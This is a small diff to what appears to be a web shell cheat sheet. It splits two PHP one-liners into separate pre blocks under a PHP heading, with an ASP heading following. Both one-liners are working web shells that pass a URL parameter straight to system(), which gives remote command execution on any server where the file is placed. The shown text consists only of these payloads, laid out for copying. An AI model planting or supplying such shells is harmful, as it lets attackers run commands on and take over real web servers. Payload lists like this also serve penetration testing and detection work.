@@ -2,6 +2,8 @@
 ## PHP
 <pre>
 &lt;?php system($_GET['cmd']); ?&gt;
+</pre>
+<pre>
 &lt;?php system($_GET[1]); ?&gt;
 </pre>
 ## ASP
